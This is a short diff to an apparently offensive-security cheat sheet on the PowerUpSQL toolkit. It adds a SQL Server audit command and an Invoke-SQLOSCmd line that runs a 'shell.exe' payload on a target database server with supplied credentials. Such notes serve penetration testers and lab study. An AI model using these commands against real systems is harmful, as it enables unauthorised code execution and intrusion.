@@ -2576,6 +2576,8 @@ https://github.com/netspi/PowerUpSQL
 https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 PS C:\> Get-SQLInstanceDomain
 PS C:\> Get-SQLQuery -Verbose -Instance "<IP address>,1433" -username "<domain>\<username>" -password "<password>" -query 'Select @@version'
+PS C:\> Invoke-SQLAudit -Verbose -Instance <IP address> -username <username> -password <password>
+PS C:\> Invoke-SQLOSCmd -Verbose -Command "C:\Users\Public\Downloads\shell.exe" -Instance <IP address> -username <username> -password <password>
 ```
 
 - RaiseChild
